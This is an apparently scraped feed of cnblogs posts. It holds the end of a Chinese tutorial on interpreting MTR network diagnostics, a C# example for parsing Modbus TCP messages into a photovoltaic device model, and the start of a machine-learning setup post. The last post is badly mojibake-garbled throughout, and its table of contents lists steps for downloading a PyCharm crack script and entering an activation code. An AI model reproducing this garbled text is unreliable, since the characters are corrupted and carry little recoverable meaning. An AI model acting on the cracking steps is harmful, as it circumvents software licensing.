代表无响应</td>\n</tr>\n<tr>\n<td><code>Loss%</code></td>\n<td>丢包率</td>\n<td><strong>核心指标</strong></td>\n</tr>\n<tr>\n<td><code>Snt</code></td>\n<td>发送包数</td>\n<td>统计样本量</td>\n</tr>\n<tr>\n<td><code>Last</code></td>\n<td>最近一次延迟</td>\n<td>波动参考</td>\n</tr>\n<tr>\n<td><code>Avg</code></td>\n<td>平均延迟</td>\n<td>主要看</td>\n</tr>\n<tr>\n<td><code>Best</code></td>\n<td>最小延迟</td>\n<td>理想情况</td>\n</tr>\n<tr>\n<td><code>Wrst</code></td>\n<td>最大延迟</td>\n<td>是否有抖动</td>\n</tr>\n<tr>\n<td><code>StDev</code></td>\n<td>抖动</td>\n<td>越小越稳定</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"icmp限速\">ICMP限速</h4>\n<p>分析MTR输出时，需要关注两个方面：<strong>丢包率</strong>和<strong>延迟</strong>。如果在某个跳点看到一定程度的丢包，这可能说明该路由器有问题。然而，一些服务提供商普遍会限制MTR使用的<code>ICMP</code>响应速率。这可能会让人误以为丢包，实际上并没有丢包。要判断看到的丢包是真实的还是速率限制引起的，可以看看后续跳跃。如果跳跃显示损失为0.0%，那么很可能是因为：<code>ICMP</code>响应速率限制导致的而非真实的丢包，以下面的MTR结果为例:</p>\n<pre><code>root@localhost:~# mtr -r www.google.com\nHOST: example                       Loss%   Snt   Last  Avg  Best  Wrst   StDev\n   1. 63.247.74.43                  0.0%    10    0.3   0.6   0.3   1.2   0.3\n   2. 63.247.64.157                50.0%    10    0.4   1.0   0.4   6.1   1.8\n   3. 209.51.130.213                0.0%    10    0.8   2.7   0.8  19.0   5.7\n   4. aix.pr1.atl.google.com        0.0%    10    6.7   6.8   6.7   6.9   0.1\n   5. 72.14.233.56                  0.0%    10    7.2   8.3   7.1  16.4   2.9\n   6. 209.85.254.247                0.0%    10   39.1  39.4  39.1  39.7   0.2\n   7. 64.233.174.46                 0.0%    10   39.6  40.4  39.4  46.9   2.3\n   8. gw-in-f147.1e100.net          0.0%    10   39.6  40.5  39.5  46.7   2.2\n</code></pre>\n<p>第二跳的丢包率虽然是 50%，但是其后续跳没有丢包且最终能到到达第8跳，所以整个链路实际上通的，第二跳的丢包率是因为<code>ICMP</code>限速导致的。</p>\n<p>可能有的同学会有疑问了，难道最后一跳不会出现<code>ICMP</code>限速吗？<br />\n实际上，<code>mtr</code>发送数据包后，会根据收到的 ICMP 响应类型来判断：</p>\n<pre><code>中间跳返回：ICMP Type 11 (Time Exceeded)\n            → \"TTL 耗尽，我不是目标\"\n            → 继续增加 TTL 探测下一跳\n\n最后一跳返回：ICMP Type 0 (Echo Reply)\n或 ICMP Type 3 (Destination Unreachable)\n            → \"我就是目标主机\"\n            → 停止探测\n</code></pre>\n<p>过程可以类比快递配送链路：</p>\n<ul>\n<li>中间转运站（路由器）：可能不会告诉你\"包裹经过了这里\"（限制或完全不响应ICMP Time Exceeded）</li>\n<li>最终收货点（目标主机）：必须签收并确认\"收到了\"（响应ICMP Echo Reply）</li>\n</ul>\n<p>即使中间转运站不告诉你进度，只要最后收到包裹并有签收确认，就说明整条链路是通的。</p>\n<h4 id=\"真实的丢包场景\">真实的丢包场景</h4>\n<p>以下面的MTR结果为例：</p>\n<pre><code>root@localhost:~# mtr -r www.google.com\nHOST: localhost                      Loss%   Snt   Last  Avg  Best  Wrst   StDev\n   1. 63.247.74.43                   0.0%    10    0.3   0.6   0.3   1.2   0.3\n   2. 63.247.64.157                  0.0%    10    0.4   1.0   0.4   6.1   1.8\n   3. 209.51.130.213                60.0%    10    0.8   2.7   0.8  19.0   5.7\n   4. aix.pr1.atl.google.com        60.0%    10    6.7   6.8   6.7   6.9   0.1\n   5. 72.14.233.56                  50.0%    10    7.2   8.3   7.1  16.4   2.9\n   6. 209.85.254.247                40.0%    10   39.1  39.4  39.1  39.7   0.2\n   7. 64.233.174.46                 40.0%    10   39.6  40.4  39.4  46.9   2.3\n   8. gw-in-f147.1e100.net          40.0%    10   39.6  40.5  39.5  46.7   2.2\n</code></pre>\n<p>在这个示例中，第三跳的丢包率高达60%且后续跳均出现了丢包率并且影响了最后的第8跳，所以可以判断第三跳是有问题的。由于中间跳<code>ICMP</code>限速和真实丢包会同时发生，所以会出现中间跳的丢包率高于最后一跳丢包率。</p>\n<p>当判断确实出现了丢包时，最好使用MTR双向测试下，因为数据包可能是发送时遇到了问题，也可能是在返回响应时出现了问题。</p>\n<h4 id=\"延迟\">延迟</h4>\n<p>MTR还能测试主机与目标主机之间连接的延迟。由于物理约束，延迟总是随着路由跳数的增加而增加。然而，增长应保持一致且线性。延迟通常是相对的，并且很大程度上取决于主机连接的质量及其物理距离。 在评估可能有问题的连接的 MTR 报告时，除了给定区域中其他主机之间的已知连接速度之外，还应将早期的功能齐全的报告视为上下文。</p>\n<p>以下面的MTR结果为例：</p>\n<pre><code>root@localhost:~# mtr --report www.google.com\nHOST: localhost                      Loss%   Snt   Last   Avg  Best  Wrst  StDev\n    1. 63.247.74.43                  0.0%    10    0.3   0.6   0.3   1.2   0.3\n    2. 63.247.64.157                 0.0%    10    0.4   1.0   0.4   6.1   1.8\n    3. 209.51.130.213                0.0%    10    0.8   2.7   0.8  19.0   5.7\n    4. aix.pr1.atl.google.com        0.0%    10  388.0 360.4 342.1 396.7   0.2\n    5. 72.14.233.56                  0.0%    10  390.6 360.4 342.1 396.7   0.2\n    6. 209.85.254.247                0.0%    10  391.6 360.4 342.1 396.7   0.4\n    7. 64.233.174.46                 0.0%    10  391.8 360.4 342.1 396.7   2.1\n    8. gw-in-f147.1e100.net          0.0%    10  392.0 360.4 342.1 396.7   1.2\n</code></pre>\n<p>在第3跳和第4跳之间延迟突然增高，并且在后续跳中仍然很高，这可能表明存在网络延迟问题。</p>\n<p>但是，高延迟并不总是意味着当前路由有问题。 像上面这样的报告意味着，尽管第四跳存在某种问题，流量仍然到达目标主机并返回源主机。 延迟也可能是由返回路线问题引起的。 返回路线不会在 MTR 报告中看到，并且数据包可以采用完全不同的路线往返于特定目的地。</p>\n<p>在上面的示例中，虽然在第3跳和第4跳之间的延迟存在较大跳跃，但在任何后续跳中延迟并没有再增高。 由此，可以合理地假设第四个路由器存在问题。</p>\n<p><code>ICMP</code>限速也会导致延迟增加，以下面的MTR报告为例：</p>\n<pre><code>root@localhost:~# mtr --report www.google.com\nHOST:  localhost                     Loss%   Snt   Last  Avg  Best  Wrst   StDev\n    1. 63.247.74.43                  0.0%    10    0.3   0.6   0.3   1.2   0.3\n    2. 63.247.64.157                 0.0%    10    0.4   1.0   0.4   6.1   1.8\n    3. 209.51.130.213                0.0%    10    0.8   2.7   0.8  19.0   5.7\n    4. aix.pr1.atl.google.com        0.0%    10    6.7   6.8   6.7   6.9   0.1\n    5. 72.14.233.56                  0.0%    10  254.2 250.3 230.1 263.4   2.9\n    6. 209.85.254.247                0.0%    10   39.1  39.4  39.1  39.7   0.2\n    7. 64.233.174.46                 0.0%    10   39.6  40.4  39.4  46.9   2.3\n    8. gw-in-f147.1e100.net          0.0%    10   39.6  40.5  39.5  46.7   2.2\n</code></pre>\n<p>乍一看，第4跳和第5跳之间的延迟突然增高了。然而，在第五跳之后，延迟急剧下降。这里测得的实际延迟约为40ms，且并没有影响最后一条的延迟，网络实际上是没有问题的。</p>\n<h4 id=\"什么时候需要使用tcp和udp协议进行检测\">什么时候需要使用TCP和UDP协议进行检测？</h4>\n<p>三种协议的对比</p>\n<table>\n<thead>\n<tr>\n<th>协议</th>\n<th>默认使用场景</th>\n<th>优点</th>\n<th>缺点</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ICMP</td>\n<td>默认模式</td>\n<td>最常用,大多数设备支持</td>\n<td>容易被防火墙过滤</td>\n</tr>\n<tr>\n<td>UDP</td>\n<td>测试 UDP 服务</td>\n<td>模拟真实 UDP 流量</td>\n<td>可能被过滤,不可靠</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>测试 Web/API 服务</td>\n<td>最接近真实应用流量,不易被过滤</td>\n<td>需要指定端口</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"什么时候使用tcp模式\">什么时候使用TCP模式？</h5>\n<ul>\n<li>场景 1：ICMP被防火墙屏蔽或ICMP限速</li>\n</ul>\n<pre><code># ICMP 模式失败\nmtr api.example.com\n→ 大量 \"waiting for reply\" 或 100% 丢包\n\n# 改用 TCP 模式（测试 443 端口）\nmtr -T -P 443 api.example.com\n→ 正常显示路由路径\n</code></pre>\n<ul>\n<li>场景 2：测试特定服务的网络质量</li>\n</ul>\n<pre><code># 测试 HTTPS 服务（443 端口）\nmtr -T -P 443 api.example.com\n\n# 测试 HTTP 服务（80 端口）\nmtr -T -P 80 www.example.com\n\n# 测试 SSH 服务（22 端口）\nmtr -T -P 22 server.example.com\n\n# 测试数据库（3306 端口）\nmtr -T -P 3306 db.example.com\n</code></pre>\n<p><code>mtr</code>使用TCP协议进行网络检测的过程是通过 TCP三次握手的前两步完成的</p>\n<pre><code>Client → SYN (dst port 443, TTL=N)\nServer → SYN-ACK\nClient → RST   （立刻）\n\n</code></pre>\n<p><code>mtr</code>的TCP模式只完成“三次握手的前两步”，并在收到响应后立刻主动 <code>RST</code>，不会建立真正的TCP连接，更不会形成大量的ESTABLISHED 连接，对目标主机性能几乎没有影响。</p>\n<h5 id=\"什么时候使用udp模式\">什么时候使用UDP模式？</h5>\n<ul>\n<li>场景 1：测试 UDP 应用</li>\n</ul>\n<pre><code># 测试 DNS 服务（53 端口）\nmtr -u -P 53 8.8.8.8\n\n# 测试 VoIP/视频会议（如 10000-20000 端口范围）\nmtr -u -P 16384 meeting.example.com\n\n# 测试游戏服务器\nmtr -u -P 27015 game.example.com\n\n# 测试 VPN（如 OpenVPN，1194 端口）\nmtr -u -P 1194 vpn.example.com\n</code></pre>\n<ul>\n<li>场景 2：ICMP 被限流但 UDP 没有</li>\n</ul>\n<pre><code># 某些网络对 ICMP 限流但允许 UDP\nmtr -u api.example.com\n</code></pre>\n<h3 id=\"小结\">小结</h3>\n<p>有了 mtr 之后，当客户反馈诸如：“我们办公室是千兆宽带、Wi-Fi 也是满格，就是你们的产品不行，页面加载慢、接口响应慢”这类问题时，不必慌张。</p>\n<p>拉上客户一起跑一跑 <code>mtr</code>，把链路情况和丢包率、延迟摆出来，沿途每一跳的网络状态都会清清楚楚地呈现在眼前。问题究竟出在本地网络、运营商链路，还是服务器侧，基本就一目了然了。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 11:47</span>&nbsp;\n<a href=\"https://www.cnblogs.com/deep-sky\">DeepSky丶</a>&nbsp;\n阅读(<span id=\"post_view_count\">101</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "基于.NET和C#构建光伏IoT物模型方案",
      "link": "https://www.cnblogs.com/tianqing/p/19490649",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/tianqing/p/19490649\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 10:16\">\n    <span>基于.NET和C#构建光伏IoT物模型方案</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<h1 id=\"fb2e366a-0caa-4b15-a95a-7aae39712b37\">一、目前国内接入最常见、最有代表性的 4 类光伏设备</h1>\n<p>&nbsp;<span><img alt=\"image.png\" src=\"https://resource.teld.org/teldimage/101/image20260116094431.png\" width=\"833\" /></span></p>\n<h1 id=\"2205f016-c539-4de2-9335-901006b12faa\"><strong>二、华为 SUN2000 逆变器通讯报文示例</strong></h1>\n<p class=\"p1\">这是一个<strong>标准 Modbus TCP 请求报文</strong>：</p>\n<p>00 01 00 00 00 06 01 03 75 30 00 06</p>\n<p class=\"p1\">含义：</p>\n<p class=\"p1\">Modbus TCP 报文由两部分组成：</p>\n<p class=\"p1\">MBAP Header（7字节） + PDU（功能码 + 数据）</p>\n<p><img alt=\"image.png\" src=\"https://resource.teld.org/teldimage/101/image20260116094919.png\" width=\"784\" /></p>\n<p><img alt=\"image.png\" src=\"https://resource.teld.org/teldimage/101/image20260116095000.png\" width=\"785\" /></p>\n<p><img alt=\"image.png\" src=\"https://resource.teld.org/teldimage/101/image20260116095106.png\" width=\"785\" /></p>\n<p class=\"p1\">在光伏逆变器里，这类请求通常用于：</p>\n<p><img alt=\"image.png\" src=\"https://resource.teld.org/teldimage/101/image20260116095130.png\" width=\"505\" /></p>\n<p><strong>响应</strong></p>\n<p>这是一个标准的Modbus TCP 响应报文结构</p>\n<p>00 01 00 00 00 0F 01 03 0C 09 C4 00 64 13 88 00 32</p>\n<p class=\"p1\">MBAP Header（7字节） + PDU（功能码 + 数据）</p>\n<p><img alt=\"image.png\" src=\"https://resource.teld.org/teldimage/101/image20260116095300.png\" width=\"580\" /></p>\n<p>PDU数据解析</p>\n<p><img alt=\"image.png\" src=\"https://resource.teld.org/teldimage/101/image20260116095417.png\" width=\"572\" /><img alt=\"image.png\" src=\"https://resource.teld.org/teldimage/101/image20260116095352.png\" width=\"576\" /></p>\n<p>结合光伏业务的数值换算</p>\n<p class=\"p1\">厂家协议通常定义 <strong>倍率（Scale）</strong>：</p>\n<p><img alt=\"image.png\" src=\"https://resource.teld.org/teldimage/101/image20260116095454.png\" width=\"591\" /></p>\n<p>最终物模型字段赋值示例</p>\n<p>{ “dcVoltage”: 250.0, “dcCurrent”: 10.0, “dcPower”: 5.0, “internalTemp”: 50 }</p>\n<h1 id=\"f304e5ae-3f04-4a41-a4be-c8e60f804f55\">三、示例代码</h1>\n<blockquote>\n<p><strong>报文请求构造 → 响应报文解析 → 寄存器解码 → 光伏设备物模型组织</strong></p>\n</blockquote>\n<p class=\"p1\">目标：</p>\n<ul>\n<li>\n<p class=\"p1\"><strong>协议层、解析层、物模型层解耦</strong></p>\n</li>\n<li>\n<p class=\"p1\">方便后续做 <strong>多品牌 Adapter + 配置化映射</strong></p>\n</li>\n</ul>\n<p>代码结构</p>\n<p><img alt=\"image.png\" src=\"https://resource.teld.org/teldimage/101/image20260116095740.png\" width=\"350\" /></p>\n<h2 id=\"a6eafc45-6352-4934-be5d-626f569811ee\"><strong>1、Modbus TCP 请求报文构造</strong></h2>\n<p class=\"p2\"><strong>ModbusRequest.cs</strong></p>\n<pre><code class=\"language-auto\">public class ModbusRequest\n{\n    public ushort TransactionId { get; set; }\n    public byte UnitId { get; set; }\n    public byte FunctionCode { get; set; } = 0x03;\n    public ushort StartAddress { get; set; }\n    public ushort Quantity { get; set; }\n\n    public byte[] ToBytes()\n    {\n        var buffer = new List&lt;byte&gt;();\n\n        // Transaction ID\n        buffer.AddRange(BitConverter.GetBytes(TransactionId).Reverse());\n\n        // Protocol ID (0x0000)\n        buffer.Add(0x00);\n        buffer.Add(0x00);\n\n        // Length = UnitId + PDU\n        ushort length = 1 + 1 + 2 + 2;\n        buffer.AddRange(BitConverter.GetBytes(length).Reverse());\n\n        // Unit ID\n        buffer.Add(UnitId);\n\n        // PDU\n        buffer.Add(FunctionCode);\n        buffer.AddRange(BitConverter.GetBytes(StartAddress).Reverse());\n        buffer.AddRange(BitConverter.GetBytes(Quantity).Reverse());\n\n        return buffer.ToArray();\n    }\n}</code></pre>\n<h2 id=\"895c43c7-2f86-4508-9506-a46a7b7c0499\"><strong>2. Modbus TCP 响应解析</strong></h2>\n<p class=\"p1\"><strong>ModbusResponse.cs</strong></p>\n<pre><code class=\"language-auto\">public class ModbusResponse\n{\n    public ushort TransactionId { get; set; }\n    public byte UnitId { get; set; }\n    public byte FunctionCode { get; set; }\n    public byte ByteCount { get; set; }\n    public byte[] Data { get; set; }\n}</code></pre>\n<h3 id=\"7bdc7b40-6efc-47c5-98a5-fc5df2a23743\"><strong>ModbusParser.cs</strong></h3>\n<pre><code class=\"language-auto\">public static class ModbusParser\n{\n    public static ModbusResponse ParseResponse(byte[] response)\n    {\n        if (response.Length &lt; 9)\n            throw new Exception(\"Invalid Modbus response length\");\n\n        var result = new ModbusResponse();\n\n        result.TransactionId = ReadUInt16(response, 0);\n        ushort protocolId = ReadUInt16(response, 2);\n        ushort length = ReadUInt16(response, 4);\n\n        if (protocolId != 0)\n            throw new Exception(\"Invalid Protocol ID\");\n\n        result.UnitId = response[6];\n        result.FunctionCode = response[7];\n        result.ByteCount = response[8];\n\n        result.Data = response.Skip(9).Take(result.ByteCount).ToArray();\n\n        return result;\n    }\n\n    private static ushort ReadUInt16(byte[] buffer, int index)\n    {\n        return (ushort)((buffer[index] &lt;&lt; 8) | buffer[index + 1]);\n    }\n}</code></pre>\n<p class=\"p1\">&nbsp;</p>\n<h2 id=\"8d252688-3fa5-4971-bc3c-ffffdfe64a4c\"><strong>3. 寄存器解码（倍率 + 字节序）</strong></h2>\n<p class=\"p2\"><strong>RegisterDecoder.cs</strong></p>\n<pre><code class=\"language-auto\">public static class RegisterDecoder\n{\n    public static ushort ReadUInt16(byte[] data, int registerIndex)\n    {\n        int offset = registerIndex * 2;\n        return (ushort)((data[offset] &lt;&lt; 8) | data[offset + 1]);\n    }\n\n    public static double ReadScaledValue(\n        byte[] data,\n        int registerIndex,\n        double scale)\n    {\n        return ReadUInt16(data, registerIndex) / scale;\n    }\n}</code></pre>\n<h2 id=\"4cdd911c-5fa7-4365-8d9d-a56ecf790ca0\"><strong>4、光伏设备物模型定义</strong></h2>\n<p class=\"p2\"><strong>PvThingModel.cs</strong></p>\n<pre><code class=\"language-auto\">public class PvThingModel\n{\n    public double DcVoltage { get; set; }\n    public double DcCurrent { get; set; }\n    public double DcPower { get; set; }\n    public double InternalTemperature { get; set; }\n\n    public DateTime Timestamp { get; set; } = DateTime.UtcNow;\n}</code></pre>\n<h2 id=\"003ffa63-3819-4c8d-9a29-505a581bf28f\"><strong>5. 从响应到物模型的映射</strong></h2>\n<pre><code class=\"language-auto\">public static class PvThingModelBuilder\n{\n    public static PvThingModel FromModbus(ModbusResponse response)\n    {\n        var data = response.Data;\n\n        return new PvThingModel\n        {\n            DcVoltage = RegisterDecoder.ReadScaledValue(data, 0, 10),     // 30000\n            DcCurrent = RegisterDecoder.ReadScaledValue(data, 1, 10),     // 30001\n            DcPower = RegisterDecoder.ReadScaledValue(data, 2, 1000),     // 30002\n            InternalTemperature = RegisterDecoder.ReadUInt16(data, 3)     // 30003\n        };\n    }\n}</code></pre>\n<h2 id=\"d3638961-f015-4550-afc5-d0c991937f10\"><strong>6. 完整示例调用（Demo）</strong></h2>\n<pre><code class=\"language-auto\">public class Demo\n{\n    public static void Run()\n    {\n        // 1. 构造请求\n        var request = new ModbusRequest\n        {\n            TransactionId = 1,\n            UnitId = 1,\n            StartAddress = 30000,\n            Quantity = 6\n        };\n\n        byte[] requestBytes = request.ToBytes();\n\n        // === 这里通常通过 TCP Socket 发送 requestBytes ===\n\n        // 2. 模拟接收到的响应报文\n        byte[] responseBytes =\n        {\n            0x00,0x01,0x00,0x00,0x00,0x0F,0x01,0x03,0x0C,\n            0x09,0xC4,0x00,0x64,0x13,0x88,0x00,0x32\n        };\n\n        // 3. 解析响应\n        var response = ModbusParser.ParseResponse(responseBytes);\n\n        // 4. 构建物模型\n        PvThingModel model = PvThingModelBuilder.FromModbus(response);\n\n        Console.WriteLine($\"DC Voltage: {model.DcVoltage} V\");\n        Console.WriteLine($\"DC Current: {model.DcCurrent} A\");\n        Console.WriteLine($\"DC Power: {model.DcPower} kW\");\n        Console.WriteLine($\"Temperature: {model.InternalTemperature} ℃\");\n    }\n}</code></pre>\n<p>&nbsp;</p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 10:16</span>&nbsp;\n<a href=\"https://www.cnblogs.com/tianqing\">Eric zhou</a>&nbsp;\n阅读(<span id=\"post_view_count\">344</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "è‡ªå­¦æœºå™¨æ·±åº¦å­¦ä¹",
      "link": "https://www.cnblogs.com/lichengxiao/p/19490388",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/lichengxiao/p/19490388\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäºŽ 2026-01-16 10:00\">\n    <span>è‡ªå­¦æœºå™¨æ·±åº¦å­¦ä¹ </span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"è‡ªå­¦æœºå™¨æ·±åº¦å­¦ä¹ \">è‡ªå­¦æœºå™¨æ·±åº¦å­¦ä¹ </h1>\n<hr />\n<p></p><div class=\"toc\"><div class=\"toc-container-header\">ç›®å½•</div><ul><li><a href=\"#è‡ªå­¦æœºå™¨æ·±åº¦å­¦ä¹\" rel=\"noopener nofollow\">è‡ªå­¦æœºå™¨æ·±åº¦å­¦ä¹ </a><ul><li><a href=\"#æ­£å¼å¼€å§‹å‰çš„åºŸè¯å’Œè½¯ä»¶æŽ¨è\" rel=\"noopener nofollow\">æ­£å¼å¼€å§‹å‰çš„åºŸè¯å’Œè½¯ä»¶æŽ¨è</a></li><li><a href=\"#çŽ¯å¢ƒå®‰è£\" rel=\"noopener nofollow\">çŽ¯å¢ƒå®‰è£…</a><ul><li><a href=\"#pycharmæœ€æ–°ç‰ˆå®‰è£…æ¿€æ´»\" rel=\"noopener nofollow\">pyCharmæœ€æ–°ç‰ˆå®‰è£…æ¿€æ´»</a><ul><li><a href=\"#1å®‰è£…pycharm\" rel=\"noopener nofollow\">1.å®‰è£…PyCharm</a></li><li><a href=\"#2ä¸‹è½½ç ´è§£è„šæœ¬\" rel=\"noopener nofollow\">2.ä¸‹è½½ç ´è§£è„šæœ¬</a></li><li><a href=\"#3å¼€å§‹æ¿€æ´»\" rel=\"noopener nofollow\">3.å¼€å§‹æ¿€æ´»</a></li><li><a href=\"#4å¯åŠ¨ide-è¾“å…¥æŒ‡å®šæ¿€æ´»ç \" rel=\"noopener nofollow\">4.å¯åŠ¨IDE, è¾“å…¥æŒ‡å®šæ¿€æ´»ç </a></li><li><a href=\"#5å¸¸è§é—®é¢˜\" rel=\"noopener nofollow\">5.å¸¸è§é—®é¢˜</a></li></ul></li><li><a href=\"#anacondaå®‰è£\" rel=\"noopener nofollow\">Anacondaå®‰è£…</a></li><li><a href=\"#anacondaåŸºæœ¬é…ç½®\" rel=\"noopener nofollow\">AnacondaåŸºæœ¬é…ç½®</a><ul><li><a href=\"#1çŽ¯å¢ƒå˜é‡çš„é…ç½®\" rel=\"noopener nofollow\">1.çŽ¯å¢ƒå˜é‡çš„é…ç½®</a></li><li><a href=\"#2anacondaé»˜è®¤çŽ¯å¢ƒä¿å­˜è·¯å¾„å’Œä¸‹è½½æºä¿®æ”¹\" rel=\"noopener nofollow\">2.Anacondaé»˜è®¤çŽ¯å¢ƒä¿å­˜è·¯å¾„å’Œä¸‹è½½æºä¿®æ”¹</a></li></ul></li><li><a href=\"#pythonå’ŒopencvçŽ¯å¢ƒé…ç½®\" rel=\"noopener nofollow\">pythonå’ŒOpenCVçŽ¯å¢ƒé…ç½®</a></li><li><a href=\"#cuda128å®‰è£\" rel=\"noopener nofollow\">CUDA12.8å®‰è£…</a><ul><li><a href=\"#1æ£€æŸ¥è®¾å¤‡æ˜¾å¡\" rel=\"noopener nofollow\">1.æ£€æŸ¥è®¾å¤‡æ˜¾å¡</a></li><li><a href=\"#2æŸ¥çœ‹nvidiaç‰ˆæœ¬\" rel=\"noopener nofollow\">2.æŸ¥çœ‹NVIDIAç‰ˆæœ¬</a></li><li><a href=\"#3æ˜¾å¡gpuåŠå…¶ç›¸å…³æ¦‚å¿µ\" rel=\"noopener nofollow\">3.æ˜¾å¡GPUåŠå…¶ç›¸å…³æ¦‚å¿µ</a></li><li><a href=\"#4cudaçš„ä¸‹è½½ä¸Žå®‰è£\" rel=\"noopener nofollow\">4.CUDAçš„ä¸‹è½½ä¸Žå®‰è£…</a></li><li><a href=\"#5æ£€æŸ¥ç³»ç»ŸçŽ¯å¢ƒå˜é‡\" rel=\"noopener nofollow\">5.æ£€æŸ¥ç³»ç»ŸçŽ¯å¢ƒå˜é‡</a></li><li><a href=\"#6éªŒè¯å®‰è£…æ˜¯å¦æˆåŠŸ\" rel=\"noopener nofollow\">6.éªŒè¯å®‰è£…æ˜¯å¦æˆåŠŸ</a></li></ul></li><li><a href=\"#pytorch29å®‰è£\" rel=\"noopener nofollow\">PyTorch2.9å®‰è£…</a></li><li><a href=\"#çŽ¯å¢ƒæµ‹è¯•\" rel=\"noopener nofollow\">çŽ¯å¢ƒæµ‹è¯•</a></li></ul></li></ul></li></ul></div><p></p>\n<h2 id=\"æ­£å¼å¼€å§‹å‰çš„åºŸè¯å’Œè½¯ä»¶æŽ¨è\">æ­£å¼å¼€å§‹å‰çš„åºŸè¯å’Œè½¯ä»¶æŽ¨è</h2>\n<p>æ¥åˆ°æ·±åœ³ä¹‹åŽï¼Œè€æ¿ç»™æˆ‘é…äº†ä¸€å¥—i7-14700kf+5060Tiçš„ç”µè„‘ï¼Œè®©æˆ‘ç”¨pythonè·‘æœºå™¨å­¦ä¹ </p>\n<p>æ–°çš„ç”µè„‘åˆ°æ‰‹æ€»è¦è£…ä¸€äº›ä½¿ç”¨çš„è½¯ä»¶ï¼Œè¿™é‡Œæœ‰ä¸€ç‚¹ä¸ªäººçš„ä½¿ç”¨ä¹ æƒ¯ï¼Œæ¯ä¸€ä¸ªè½¯ä»¶éƒ½å¾ˆå¥½ç”¨ï¼Œè€Œä¸”å…¨éƒ½å…è´¹æ— å¹¿å‘Šï¼Œåšä¸€ä¸‹æŽ¨èï¼Œçœ‹çœ‹ä½ ä»¬çš„æƒ³æ³•</p>\n<blockquote>\n<p>ç³»ç»Ÿå®‰å…¨ä¸Žé˜²ç«å¢™ï¼š<strong><code>ç«ç»’å®‰å…¨</code></strong></p>\n</blockquote>\n<p>å®˜æ–¹ç½‘ç«™ï¼š<a href=\"https://www.huorong.cn/\" rel=\"noopener nofollow\" target=\"_blank\">ç«ç»’å®‰å…¨</a></p>\n<p>è¿™ä¸ªè½¯ä»¶æˆ‘ç”¨äº†å¤§å­¦4å¹´ï¼Œæœ€å¼€å§‹ä¹Ÿæ˜¯ç¬”è®°æœ¬è‡ªå¸¦çš„è¿ˆå…‹è²å•¥çš„ï¼Œä½†æ˜¯æ€»æ˜¯è§‰å¾—ä¸å¥½ç”¨ï¼Œåšä¸€äº›è½¯ä»¶ç¼–ç¨‹çš„æ—¶å€™ç»å¸¸è¢«æ‹¦æˆªã€‚åŽé¢å¶ç„¶å‘çŽ°äº†è¿™ä¸ªï¼Œå°±ä¸€ç›´ä½¿ç”¨äº†ï¼Œä½¿ç”¨æ„Ÿè§‰å¥½æ¯”æ— æ„Ÿå†…è£¤ï¼ï¼ï¼</p>\n<p><img alt=\"image-20260115102903048\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092325993-1667500500.png\" /></p>\n<blockquote>\n<p>æ–‡ä»¶åŽ‹ç¼©ä¸Žè§£åŽ‹ç¼©ï¼š<strong><code>Bandizip</code></strong></p>\n</blockquote>\n<p>å®˜æ–¹ç½‘ç«™ï¼š<a href=\"https://www.bandisoft.com/bandizip/\" rel=\"noopener nofollow\" target=\"_blank\">Bandizip å®˜æ–¹ç½‘ç«™ - å…è´¹åŽ‹ç¼©è½¯ä»¶ä¸‹è½½ (Windows)</a></p>\n<p>å¤§å­¦çš„æ—¶å€™ä¸€ç›´ç”¨å¾®è½¯ç³»ç»Ÿè‡ªå¸¦çš„ï¼Œè¿˜æœ‰ç”¨è¿‡WinRARå’Œ360åŽ‹ç¼©å’Œ2345å¥½åŽ‹ï¼Œå¹¿å‘Šæ»¡å¤©é£žï¼ŒåŽé¢å°±æ˜¯ç”¨çš„è¿™ä¸ªäº†ï¼Œè™½ç„¶è¿™ä¸ªå…è´¹ç‰ˆä¹Ÿä¼šæœ‰å¼¹çª—ï¼Œä½†æ˜¯æ˜¯å»ºè®®å……å€¼é‚£ç§ï¼Œä¹Ÿè¿˜èƒ½æŽ¥å—ï¼Œé¢‘çŽ‡ä¹Ÿä¸é«˜</p>\n<p><img alt=\"image-20260115104129654\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092325248-1632921545.png\" /></p>\n<blockquote>\n<p>è½¯ä»¶å¸è½½å·¥å…·ï¼š<strong><code>Geek</code></strong></p>\n</blockquote>\n<p>å®˜æ–¹ç½‘ç«™ï¼š<a href=\"https://geekuninstaller.com/\" rel=\"noopener nofollow\" target=\"_blank\">Geek Uninstaller - the best FREE uninstaller</a></p>\n<p>è¿™ä¸ªè½¯ä»¶æœ€å¤§çš„ä¼˜ç‚¹æ˜¯å¸è½½è½¯ä»¶æ—¶ä¼šæ¸…ç†å‰©ä½™åžƒåœ¾ï¼ŒçœŸæ­£çš„æ— ç—•ï¼</p>\n<p><img alt=\"image-20260115104334199\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092324804-317674390.png\" /></p>\n<blockquote>\n<p>ä¸‹è½½åŠ é€Ÿï¼š<strong><code>IDM</code></strong>(Internet Download 